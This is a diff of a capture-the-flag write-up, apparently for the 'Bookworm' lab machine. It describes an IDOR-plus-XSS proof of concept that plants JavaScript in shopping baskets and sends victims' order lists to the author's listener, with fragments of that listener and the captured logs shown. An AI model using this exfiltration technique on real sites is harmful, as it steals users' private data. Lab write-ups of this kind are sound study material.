@@ -160,9 +160,7 @@ Starting server on port 8000
 I've been created POC to create new basket id and inject ou payload into them using the  `IDOR` vulnerability and with `Xss` attack to get order a list of orders from existing users. Xss attack used for sending the orders from existing users to my webserver and i can get the a list of orders victim's basket . The code at the below used for find victim's orders id try one by one id also including with my malicious code javascript and after i running this poc i will got orders id victim.
 
 
-```Python
-// post.py
-
+```post.py
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
 class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
@@ -186,8 +184,7 @@ if __name__ == "__main__":
 
 
 
-```Python
-// basket.py
+```basket.py
 import re
 import requests
 
@@ -239,10 +236,10 @@ while True:
 
 To run this code we need running `post.py` and `basket.py`
 
-```html
+```Response
  python3 post.py | grep href
-10.10.14.122 - - [23/Jan 2024 07:22:49] "POST / HTTP/1.1" 200 -
-10.10.11.215 - - [23/Jan 2024 07:23:19] "POST / HTTP/1.1" 200 -
+10.10.14.122 - - [23/Jan/2024 07:22:49] "POST / HTTP/1.1" 200 -
+10.10.11.215 - - [23/Jan/2024 07:23:19] "POST / HTTP/1.1" 200 -
       href="/static/css/bootstrap.min.css"
         <a class="navbar-brand" href="#">Bookworm</a>
               <a class="nav-link " href="/">Home</a>
@@ -255,7 +252,7 @@ To run this code we need running `post.py` and `basket.py`
         <a href="/order/172">View Order</
         <a href="/order/185">View Order</
         <a href="/order/230">View Order</
-10.10.11.215 - - [23/Jan//images/bookworm/2024 07:23:19] "POST / HTTP/1.1" 200 -
+10.10.11.215 - - [23/Jan/2024 07:23:19] "POST / HTTP/1.1" 200 -
       href="/static/css/bootstrap.min.css"
         <a class="navbar-brand" href="#">Bookworm</a>
               <a class="nav-link " href="/">Home</a>
@@ -300,7 +297,7 @@ After i ran `post.py` and `basket.py` i saw file .pdf on `/download`
 ```
  <a href="/download/7?bookIds=9" download="Tom Slade with the Flying Corps: A Campfire Tale.pdf">Download e-book</a>
 <a href="/profile">View Your Other Orders</a>
-10.10.11.215 - - [23/Jan//images/bookworm/2024 08:26:08] "POST / HTTP/1.1" 200 -
+10.10.11.215 - - [23/Jan 2024 08:26:08] "POST / HTTP/1.1" 200 -
       href="/static/css/bootstrap.min.css"
         <a class="navbar-brand" href="#">Bookworm</a>
               <a class="nav-link " href="/">Home</a>
@@ -415,8 +412,8 @@ VU <  |. UxUy  l K ǡo  d m^   b    /  FA!  z   , c     _O 9.!
 ```
 the response still same as pdf file but look like zip file to get file contain `Unknown.pdf` we'll try create a python webserver to get the pdf file.
 
-- web.py
-```
+
+```web.py
 from pathlib import Path
 from flask import Flask, request
 
@@ -589,8 +586,8 @@ calibre  index.js  node_modules  output  package.json  package-lock.json  proces
 
 ## Source Code review
 
-- index.js
-```
+
+```index.js
 const express = require("express");
 const nunjucks = require("nunjucks");
 const fileUpload = require("express-fileupload");
